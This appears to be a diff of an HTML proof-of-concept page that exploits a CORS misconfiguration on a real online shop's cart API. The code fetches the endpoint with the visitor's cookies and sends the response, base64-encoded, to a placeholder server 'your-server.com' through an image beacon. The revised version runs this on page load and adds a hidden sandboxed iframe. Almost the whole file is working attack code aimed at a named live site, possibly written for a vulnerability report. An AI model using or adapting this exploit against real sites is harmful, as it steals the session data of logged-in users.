@@ -2,51 +2,42 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CORS PoC</title>
+<title>CORS Sandbox PoC</title>
 </head>
 
 <body>
 
 <h2>Loading...</h2>
-<pre id="out"></pre>
+
+<iframe id="frame" sandbox="allow-scripts allow-same-origin" style="display:none;"></iframe>
 
 <script>
 
-function log(label, data){
-    document.getElementById("out").innerText += 
-        "[DATA] " + label + JSON.stringify(data) + "\n";
+function log(data){
+    let img = new Image();
+    img.src = "https://your-server.com/log?d=" + btoa(data);
 }
 
+async function exploit(){
+    try{
 
-const endpoints = {
-    cart: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-    count: "https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount"
-};
+        let res = await fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", {
+            method: "GET",
+            credentials: "include"
+        });
 
-for (let key in endpoints){
+        let text = await res.text();
 
-    fetch(endpoints[key], {
-        method: "GET",
-        credentials: "include",
-        headers: {
-            "Accept": "application/json, text/plain, */*"
-        }
-    })
-    .then(r => r.json())
-    .then(data => {
-        log(key, data);
+        document.body.innerHTML += "<pre>"+text+"</pre>";
 
-        // exfiltration
-        new Image().src =
-            "https://your-server.com/log?d=" +
-            btoa(key + ":" + JSON.stringify(data));
+        log("SUCCESS: " + text);
 
-    })
-    .catch(e => {
-        log(key, {error: e.toString()});
-    });
-
+    }catch(e){
+        log("ERROR: " + e);
+    }
 }
+
+exploit();
 
 </script>
 
